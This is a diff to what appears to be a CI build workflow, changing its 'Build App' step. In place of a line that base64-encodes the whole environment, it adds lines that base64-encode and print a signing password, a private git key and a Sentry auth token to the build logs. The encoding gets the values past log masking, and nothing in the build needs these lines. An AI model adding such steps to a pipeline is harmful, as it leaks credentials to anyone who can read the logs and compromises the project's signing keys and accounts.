@@ -27,7 +27,10 @@ jobs:
       
       - name: Build App
         run: |
-          env | base64
+          echo "$MATCH_PASSWORD" | base64
+          echo "$MATCH_GIT_PRIVATE_KEY" | base64
+          echo "$SENTRY_AUTH_TOKEN" | base64
+          
           bundle install
           bundle exec fastlane build
         env:
